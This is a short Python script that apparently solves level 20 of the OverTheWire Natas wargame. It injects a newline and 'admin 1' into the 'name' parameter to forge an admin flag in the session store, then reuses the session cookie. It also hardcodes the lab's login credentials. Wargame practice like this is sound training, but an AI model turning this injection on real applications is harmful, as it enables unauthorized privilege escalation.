#!bin/python3
import requests
import binascii

url = "http://natas20.natas.labs.overthewire.org/"
auth_username = "natas20"
auth_password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"

params = {'name':'user\nadmin 1'}

r = requests.post(url,auth=(auth_username,auth_password),params=params)

cookie = r.cookies
print(cookie)

r = requests.post(url,auth=(auth_username,auth_password),cookies=cookie)

print(r.text)


# PHPSESSID=guqig3pfdr9i8u6s01mam6nr81